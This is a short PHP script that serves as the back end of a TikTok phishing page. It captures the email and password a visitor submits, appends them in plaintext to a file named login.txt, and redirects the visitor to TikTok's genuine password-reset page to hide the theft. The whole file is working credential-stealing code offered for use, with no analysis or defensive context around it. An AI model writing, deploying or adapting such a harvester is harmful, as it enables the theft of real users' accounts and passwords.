<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'] ?? '';
    $password = $_POST['password'] ?? '';

    $log = "Tiktok Username: $email | Pass: $password\n";

    file_put_contents("login.txt", $log, FILE_APPEND);

    header('Location: https://www.tiktok.com/login/email/forget-password');
    exit();
}
?>
